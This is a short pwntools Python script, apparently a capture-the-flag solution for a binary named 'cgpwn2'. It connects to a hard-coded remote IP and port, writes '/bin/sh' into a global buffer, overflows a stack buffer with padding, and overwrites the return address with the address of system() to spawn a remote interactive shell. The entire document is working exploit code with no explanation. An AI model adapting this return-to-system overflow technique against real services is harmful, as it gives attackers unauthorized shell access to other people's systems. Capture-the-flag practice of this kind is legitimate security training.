from pwn import *
h,p = '111.200.241.244',65483
p = remote(h,p)
#p = process("./cgpwn2")
#gdb.attach("cgpwn2",'b *0x080485ec')
n_addr = 0x0804a080
system = 0x08048420
test = 0x804854d
p.sendline("/bin/sh")
pad = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKK"+p32(system)+p32(1)+p32(n_addr)
p.sendline(pad)
p.interactive()
